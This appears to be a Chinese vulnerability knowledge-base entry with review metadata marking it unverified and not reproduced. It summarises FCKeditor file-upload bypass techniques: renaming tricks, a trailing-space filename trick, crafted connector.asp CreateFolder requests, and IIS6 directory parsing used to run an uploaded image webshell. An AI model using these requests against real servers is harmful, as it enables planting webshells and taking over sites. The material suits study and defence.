---
source: "hatch 补库批 20260928"
product: "FCKeditor plus Windows/IIS6 parsing"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "三、FCKeditor 突破上传"
prerequisites: "来源所述条件，未列明部分仍待核：Editor versions absent; Windows trailing-space and IIS6 directory parsing dependencies"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-5c0c51957bcd0e3ec6de9579"
entity_id: "ve-5c0c51957bcd0e3ec6de9579"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Editor versions absent; Windows trailing-space and IIS6 directory parsing dependencies

代码与实验材料：Filename/connector snippets, no request bodies or responses

来源证据范围：Import only

- **事实待核（1）**：Editor renaming, null bytes, OS normalization and IIS parsing collapsed without version/config matrix。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 上传限制

上传限制的突破方式很多，主要还是抓包改扩展名，%00截断，添加文件头等

文件名限制
==========

二次上传绕过
------------

文件名' . ' 修改为' \_ '

FCK在上传了诸如shell.asp;.jpg的文件后，会自动将文件名改为shell\_asp;.jpg。可以继续上传同名文件，文件名会变为shell.asp;(1).jpg

提交shell.php+空格绕过
----------------------

提交shell.php+空格绕过

空格只支持windows系统，linux系统是不支持的，可提交shell.php+空格来绕过文件名限制。

iis6.0突破文件夹限制
====================

    Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=/shell.asp&NewFolderName=z.asp
    FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/shell.asp&NewFolderName=z&uuid=1244789975684
    FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp

文件解析限制
============

通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。

    http://www.0-sec.org/images/upload/201806/image/1.asp/1.jpg
